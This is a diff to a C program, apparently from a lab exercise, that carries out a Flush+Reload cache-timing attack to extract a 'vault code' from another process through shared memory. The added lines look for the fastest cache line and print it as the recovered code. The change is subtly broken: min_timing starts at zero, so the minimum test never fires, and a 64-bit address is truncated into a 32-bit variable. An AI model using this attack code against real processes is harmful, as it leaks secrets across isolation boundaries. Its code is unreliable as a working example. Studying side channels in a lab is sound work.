@@ -46,7 +46,7 @@ void busy_wait_cycles(uint64_t cycles) {
 // to flush lines and perform the reload step.
 int flush_reload(int size, uint8_t *buf) {
   uint64_t addr = (uint64_t) buf;
-  uint32_t timing = 0;
+  uint32_t timing = 0, min_timing = 0, min_addr = 0;
   uint64_t lineAddr = 0;
   for (int i = 0; i < BUF_LINES; i++) {
     // Set the first byte of each line to 1
@@ -55,20 +55,22 @@ int flush_reload(int size, uint8_t *buf) {
     busy_wait_cycles(1000); // 78 cycles is the average time to access a line in the cache by the vault
     timing=measure_line_access_time(lineAddr);
 
-//    printf("Address = %ld, set %d  timing = %d\n",lineAddr,i*64, timing);
-
-    if (timing < 120) {
+    if (timing < min_timing) {
+      min_timing = timing;
+      min_addr = lineAddr;
       printf("Address = %ld, set %d  timing = %d\n",lineAddr,i*64, timing);
     }
+
   }
+  printf("Vault code: %d (%d)\n", min_addr, min_timing);
 }
 
 int main(int argc, char const *argv[]) {
     int fd;
     fd = shm_open(SHARED_ID, O_CREAT | O_RDWR, S_IRUSR | S_IWUSR);
     if (fd == -1){
-	printf("shm_open error\n");
-	exit(1);
+      printf("shm_open error\n");
+      exit(1);
     }
 
     int buf_size = 4096 * 512;
